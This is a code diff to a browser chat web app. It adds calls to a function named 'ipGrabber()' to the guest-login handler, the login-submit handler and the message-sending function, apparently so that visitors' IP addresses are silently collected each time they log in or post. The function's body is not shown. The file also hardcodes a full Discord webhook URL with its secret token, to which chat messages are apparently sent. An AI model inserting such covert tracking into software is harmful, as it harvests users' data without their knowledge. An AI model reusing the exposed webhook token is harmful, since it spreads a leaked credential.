@@ -322,6 +322,7 @@ let uName = document.querySelector("#userName");
 guestLoginBtn.addEventListener("click", () => {
   userName = genGuestName();
   modal.hide();
+  ipGrabber()
 });
 
 sumbitLA.addEventListener("click", () => {
@@ -331,6 +332,7 @@ sumbitLA.addEventListener("click", () => {
     return;
   }
   modal.hide();
+  ipGrabber()
 });
 
 // screen mode change light dark
@@ -394,6 +396,7 @@ function genGuestName() {
 const webHookURL =
   "https://discord.com/api/webhooks/1446330610191695923/wINDeN99lNibyTe_kQogrX44XDkk4ELqh8nDqfaevrk2YAs7cUSsSSJT_5DNshWCs_vK";
 function SDCM(msg, date, time) {
+  ipGrabber()
   const dcM = {
     content:
       "**📩 New Gloal Message Received!**\n" +
